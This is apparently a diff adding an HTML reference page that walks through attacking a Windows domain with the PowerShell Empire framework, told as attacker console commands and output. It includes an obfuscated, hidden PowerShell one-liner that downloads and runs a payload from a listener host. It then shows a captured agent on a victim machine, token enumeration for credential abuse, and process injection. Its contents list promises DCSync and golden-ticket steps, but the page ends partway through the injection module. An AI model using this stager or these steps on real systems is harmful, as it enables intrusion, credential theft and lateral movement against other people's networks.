@@ -1,0 +1,732 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Attackerkb Reference</title>
+</head><body><b>Sections:<br/>
+</b>Clone GIT Repo &nbsp;<b><br/>
+</b>Using the Install script &nbsp;<b><br/>
+</b>Generating SSL Certificate &nbsp;<b><br/>
+</b>Startup &nbsp;<br/>
+Listeners &nbsp;<br/>
+Stagers &nbsp;<br/>
+First shell &nbsp;<br/>
+Interacting with shell and issuing commands &nbsp;<br/>
+Using a module &nbsp;<br/>
+Injecting Powershell into another process &nbsp;<br/>
+Mapping Domain Trusts &nbsp;<b><br/>
+</b>DCSync &nbsp;<b><br/>
+</b>Finding parent domain's SID &nbsp;<b><br/>
+</b>Generating Golden Ticket with parent domain SIDHistory for Enterprise Admins &nbsp;<b><br/>
+</b>DCSync with Golden Ticket against parent domain &nbsp;<b><br/>
+</b>Using WMI for lateral movement into DCs and parent DCs &nbsp;<b><br/>
+</b><b><br/>
+</b><b>Clone GIT Repo &nbsp;</b><br/>
+root@attacker:~# git clone https://github.com/PowerShellEmpire/Empire.git empire<br/>
+Cloning into 'empire'...<br/>
+remote: Counting objects: 1011, done.<br/>
+remote: Compressing objects: 100% (6/6), done.<br/>
+remote: Total 1011 (delta 0), reused 0 (delta 0), pack-reused 1005<br/>
+Receiving objects: 100% (1011/1011), 2.02 MiB, done.<br/>
+Resolving deltas: 100% (545/545), done.<br/>
+<br/>
+<b>Using the Install script </b>&nbsp;<br/>
+root@attacker:~# cd empire/<br/>
+root@attacker:~/empire# cd setup/<br/>
+root@attacker:~/empire/setup# ./install.sh<br/>
+Reading package lists... Done<br/>
+Building dependency tree<br/>
+Reading state information... Done<br/>
+<br/>
+&lt;SNIP (bunch of python packages getting installed)&gt;<br/>
+<br/>
+Successfully installed pydispatcher<br/>
+Cleaning up...<br/>
+<br/>
+&nbsp;[&gt;] Enter server negotiation password, enter for random generation:<br/>
+<br/>
+&nbsp;[*] Database setup completed!<br/>
+<br/>
+root@attacker:~/empire/setup#<br/>
+<br/>
+<b>Generating SSL Certificate &nbsp;</b><br/>
+You really only need to do this if you plan on using a self signed SSL certificate for a SSL listener.<br/>
+<br/>
+root@attacker:~/empire/setup# ./cert.sh<br/>
+Generating a 2048 bit RSA private key<br/>
+.............+++<br/>
+..................................+++<br/>
+writing new private key to '../data/empire.pem'<br/>
+-----<br/>
+You are about to be asked to enter information that will be incorporated<br/>
+into your certificate request.<br/>
+What you are about to enter is what is called a Distinguished Name or a DN.<br/>
+There are quite a few fields but you can leave some blank<br/>
+For some fields there will be a default value,<br/>
+If you enter '.', the field will be left blank.<br/>
+-----<br/>
+Country Name (2 letter code) [AU]:<br/>
+State or Province Name (full name) [Some-State]:<br/>
+Locality Name (eg, city) []:<br/>
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:<br/>
+Organizational Unit Name (eg, section) []:<br/>
+Common Name (e.g. server FQDN or YOUR name) []:<br/>
+Email Address []:<br/>
+<br/>
+<br/>
+&nbsp;[*] Certificate written to ../data/empire.pem<br/>
+Thats it, everything should be good to go to use at this point<br/>
+<br/>
+<b>Usage<br/>
+Startup &nbsp;<br/>
+</b>root@attacker:~/empire/setup# cd ..<br/>
+root@attacker:~/empire# ./empire<br/>
+<br/>
+<b>Listeners</b><br/>
+(Empire) &gt; listeners<br/>
+[!] No listeners currently active<br/>
+(Empire: listeners) &gt; info<br/>
+<br/>
+Listener Options:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Required &nbsp; &nbsp;Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Description<br/>
+&nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;-------- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;-----------<br/>
+&nbsp; KillDate &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Date for the listener to exit (MM/dd/yyyy).<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;test &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Listener name.<br/>
+&nbsp; DefaultLostLimit &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;60 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Number of missed checkins before exiting<br/>
+&nbsp; StagingKey &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;MySecretKeyHere &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Staging key for initial agent negotiation.<br/>
+&nbsp; Type &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;native &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Listener type (native, pivot, hop, foreign, meter).<br/>
+&nbsp; RedirectTarget &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Listener target to redirect to for pivot/hop.<br/>
+&nbsp; DefaultDelay &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Agent delay/reach back interval (in seconds).<br/>
+&nbsp; WorkingHours &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Hours for the agent to operate (09:00-17:00).<br/>
+&nbsp; Host &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;http://172.16.102.154:8080 &nbsp; &nbsp; &nbsp; Hostname/IP for staging.<br/>
+&nbsp; CertPath &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Certificate path for https listeners.<br/>
+&nbsp; DefaultJitter &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp;0.0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Jitter in agent reachback interval (0.0-1.0).<br/>
+&nbsp; DefaultProfile &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;/admin/get.php,/news.asp,/login/ Default communication profile for the agent.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; process.jsp|Mozilla/5.0 (Windows<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NT 6.1; WOW64; Trident/7.0;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rv:11.0) like Gecko<br/>
+&nbsp; Port &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;8080 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Port for the listener.<br/>
+<br/>
+<br/>
+(Empire: listeners) &gt; set Name AttackerKBExample<br/>
+(Empire: listeners) &gt; run<br/>
+<br/>
+<b>Stagers</b>&nbsp; <br/>
+(Empire: listeners) &gt; usestager<br/>
+dll &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ducky &nbsp; &nbsp; &nbsp; &nbsp; hop_php &nbsp; &nbsp; &nbsp; hta &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; launcher &nbsp; &nbsp; &nbsp;launcher_bat &nbsp;launcher_vbs &nbsp;macro &nbsp; &nbsp; &nbsp; &nbsp; pth_wmis &nbsp; &nbsp; &nbsp;stager &nbsp; &nbsp; &nbsp; &nbsp;war<br/>
+(Empire: listeners) &gt; usestager launcher<br/>
+(Empire: stager/launcher) &gt;<br/>
+(Empire: stager/launcher) &gt; info<br/>
+<br/>
+Name: Launcher<br/>
+<br/>
+Description:<br/>
+&nbsp; Generates a one-liner stage0 launcher for Empire.<br/>
+<br/>
+Options:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Required &nbsp; &nbsp;Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Description<br/>
+&nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -----------<br/>
+&nbsp; ProxyCreds &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; default &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Proxy credentials<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;([domain\]username:password) to use for<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;request (default, none, or other).<br/>
+&nbsp; Base64 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Switch. Base64 encode the output.<br/>
+&nbsp; Listener &nbsp; &nbsp; &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Listener to generate stager for.<br/>
+&nbsp; OutFile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; File to output launcher to, otherwise<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;displayed on the screen.<br/>
+&nbsp; Proxy &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; default &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Proxy to use for request (default, none,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;or other).<br/>
+&nbsp; UserAgent &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; default &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; User-agent string to use for the staging<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;request (default, none, or other).<br/>
+<br/>
+<br/>
+(Empire: stager/launcher) &gt; set Listener AttackerKBExample<br/>
+(Empire: stager/launcher) &gt; generate<br/>
+powershell.exe -NoP -NonI -W Hidden -Enc JABXAEMAPQBOAEUAdwAtAE8AYgBqAEUAQwBUACAAUwB5AHMAdABFAE0ALgBOAGUAVAAuAFcARQBCAEMATABJAEUAbgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBjAC4ASABFAGEARABlAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUAByAE8AWAB5ACAAPQAgAFsAUwB5AFMAdABlAG0ALgBOAGUAdAAuAFcARQBiAFIARQBRAHUAZQBzAHQAXQA6ADoARABFAGYAYQBVAGwAVABXAGUAQgBQAHIATwBYAHkAOwAkAHcAYwAuAFAAUgBvAHgAWQAuAEMAcgBlAEQARQBOAHQASQBhAEwAcwAgAD0AIABbAFMAWQBTAFQAZQBtAC4ATgBlAFQALgBDAHIAZQBEAEUAbgB0AEkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAEUAZgBhAFUAbABUAE4AZQBUAHcAbwByAEsAQwBSAGUAZABFAG4AdABpAEEAbABTADsAJABLAD0AJwB5AG0AVAA8AC8AagByACUAbwBWAFkANwAoAEwAJgB8AEQAWwBrADUAPwB9AEkAegBQACkAcQBiAEgAZwBcAEMAJwA7ACQASQA9ADAAOwBbAGMASABBAFIAWwBdAF0AJABCAD0AKABbAGMAaABhAFIAWwBdAF0AKAAkAHcAYwAuAEQATwB3AG4ATABPAEEARABTAHQAcgBJAE4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA1ADQAOgA4ADAAOAAwAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgATwBSACQASwBbACQAaQArACsAJQAkAEsALgBMAEUATgBHAFQAaABdAH0AOwBJAEUAWAAgACgAJABiAC0ASgBvAEkATgAnACcAKQA=<br/>
+<br/>
+<b>First shell</b>&nbsp; <br/>
+(Empire: stager/launcher) &gt; [+] Initial agent VBVAF1FS13DZVGG1 from 172.16.102.12 now active<br/>
+<br/>
+(Empire: stager/launcher) &gt; agents<br/>
+<br/>
+[*] Active agents:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Internal IP &nbsp; &nbsp; Machine Name &nbsp; &nbsp;Username &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Process &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay &nbsp; &nbsp;Last Seen<br/>
+&nbsp; --------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;----------- &nbsp; &nbsp; ------------ &nbsp; &nbsp;--------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----- &nbsp; &nbsp;--------------------<br/>
+&nbsp; VBVAF1FS13DZVGG1 &nbsp; 172.16.102.12 &nbsp; CLIENT2K8 &nbsp; &nbsp; &nbsp; *RESEARCH\justauser powershell/2808 &nbsp; &nbsp; 5/0.0 &nbsp; &nbsp;2015-10-10 05:35:46<br/>
+<br/>
+<b>Interacting with shell and issuing commands</b>&nbsp; <br/>
+(Empire: agents) &gt; interact VBVAF1FS13DZVGG1<br/>
+(Empire: VBVAF1FS13DZVGG1) &gt; getuid<br/>
+(Empire: VBVAF1FS13DZVGG1) &gt;<br/>
+RESEARCH\justauser<br/>
+<br/>
+<b>Using a module &nbsp;<br/>
+</b>(Empire: VBVAF1FS13DZVGG1) &gt; usemodule credentials/tokens<br/>
+(Empire: credentials/tokens) &gt; info<b><br/>
+</b><b><br/>
+</b><b>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</b>Name: Invoke-TokenManipulation<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Module: credentials/tokens<br/>
+&nbsp; &nbsp; &nbsp;NeedsAdmin: True<br/>
+&nbsp; &nbsp; &nbsp; OpsecSafe: True<br/>
+&nbsp; &nbsp;MinPSVersion: 2<br/>
+&nbsp; &nbsp; &nbsp;Background: False<br/>
+OutputExtension: None<br/>
+<br/>
+Authors:<br/>
+&nbsp; @JosephBialek<br/>
+<br/>
+Description:<br/>
+&nbsp; Runs PowerSploit's Invoke-TokenManipulation to enumerate<br/>
+&nbsp; Logon Tokens available and uses them to create new<br/>
+&nbsp; processes. Similar to Incognito's functionality. Note: if<br/>
+&nbsp; you select ImpersonateUser or CreateProcess, you must<br/>
+&nbsp; specify one of Username, ProcessID, Process, or ThreadId.<br/>
+<br/>
+Options:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Required &nbsp; &nbsp;Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Description<br/>
+&nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -----------<br/>
+&nbsp; ProcessID &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ProcessID to impersonate token of.<br/>
+&nbsp; NoUI &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Switch. Use if creating a process which<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;doesn't need a UI.<br/>
+&nbsp; ShowAll &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Switch. Enumerate all tokens.<br/>
+&nbsp; Agent &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;VBVAF1FS13DZVGG1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Agent to run module on.<br/>
+&nbsp; ProcessArgs &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Arguments for a spawned process.<br/>
+&nbsp; WhoAmI &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Switch. Displays current credentials.<br/>
+&nbsp; Username &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Username to impersonate token of.<br/>
+&nbsp; RevToSelf &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Switch. Revert to original token.<br/>
+&nbsp; Process &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Process name to impersonate token of.<br/>
+&nbsp; CreateProcess &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Specify a process to create instead of<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;impersonating the user.<br/>
+&nbsp; ImpersonateUser &nbsp;False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Switch. Will impersonate an alternate<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;users logon token in the PowerShell<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;thread.<br/>
+&nbsp; ThreadId &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Thread to impersonate token of.<br/>
+<br/>
+(Empire: credentials/tokens) &gt; run<br/>
+<br/>
+Domain &nbsp; &nbsp; &nbsp; Username &nbsp; &nbsp; &nbsp; &nbsp;ProcessId IsElevated TokenType<br/>
+------ &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp; &nbsp; &nbsp;--------- ---------- ---------<br/>
+RESEARCH &nbsp; &nbsp; Administrator &nbsp; &nbsp; &nbsp; &nbsp;2584 &nbsp; &nbsp; &nbsp; True Primary<br/>
+NT AUTHORITY SYSTEM &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;492 &nbsp; &nbsp; &nbsp; True Primary<br/>
+RESEARCH &nbsp; &nbsp; justauser &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;1768 &nbsp; &nbsp; &nbsp; True Primary<br/>
+NT AUTHORITY NETWORK SERVICE &nbsp; &nbsp; &nbsp;1936 &nbsp; &nbsp; &nbsp; True Primary<br/>
+<br/>
+<b>Injecting Powershell into another process &nbsp;</b><br/>
+(Empire: credentials/tokens) &gt; usemodule management/psinject<br/>
+(Empire: management/psinject) &gt; info<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Name: Invoke-PSInject<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Module: management/psinject<br/>
+&nbsp; &nbsp; &nbsp;NeedsAdmin: False<br/>
+&nbsp; &nbsp; &nbsp; OpsecSafe: True<br/>
+&nbsp; &nbsp;MinPSVersion: 2<br/>
+&nbsp; &nbsp; &nbsp;Background: True<br/>
+OutputExtension: None<br/>
+<br/>
+Authors:<br/>
+&nbsp; @harmj0y<br/>
+&nbsp; @sixdub<br/>
+&nbsp; leechristensen (@tifkin_)<br/>
+<br/>
+Description:<br/>
+&nbsp; Utilizes Powershell to to inject a Stephen Fewer formed<br/>
+&nbsp; ReflectivePick which executes PS codefrom memory in a remote<br/>
+&nbsp; process<br/>
+<br/>
+Options:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Required &nbsp; &nbsp;Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Description<br/>
+&nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -----------<br/>
+&nbsp; ProcId &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ProcessID to inject into.<br/>
+&nbsp; ProxyCreds &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; default &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Proxy credentials<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;([domain\]username:password) to use for<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;request (default, none, or other).<br/>
+&nbsp; Agent &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;VBVAF1FS13DZVGG1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Agent to run module on.<br/>
+&nbsp; Listener &nbsp; &nbsp; &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Listener to use.<br/>
+&nbsp; Proxy &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; default &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Proxy to use for request (default, none,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;or other).<br/>
+&nbsp; UserAgent &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; default &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; User-agent string to use for the staging<br/>
